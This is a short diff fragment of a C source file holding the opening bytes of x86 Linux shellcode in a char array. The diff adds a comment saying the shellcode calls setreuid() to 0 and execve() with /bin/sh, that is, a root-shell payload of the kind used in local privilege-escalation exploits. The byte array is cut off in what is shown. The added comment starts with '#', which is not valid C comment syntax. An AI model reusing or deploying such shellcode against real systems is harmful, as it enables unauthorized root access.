@@ -2,6 +2,7 @@
 #include <unistd.h>
 #include <string.h>
 
+#Shellcode that calls setreuid() to 0 and execve() with /bin/sh
 char shellcode[]=
 "\x31\xc0\x31\xdb\x29\xc9\x89\xca\xb0"\
 "\x46\xcd\x80\x29\xc0\x52\x68\x2f\x2f"\
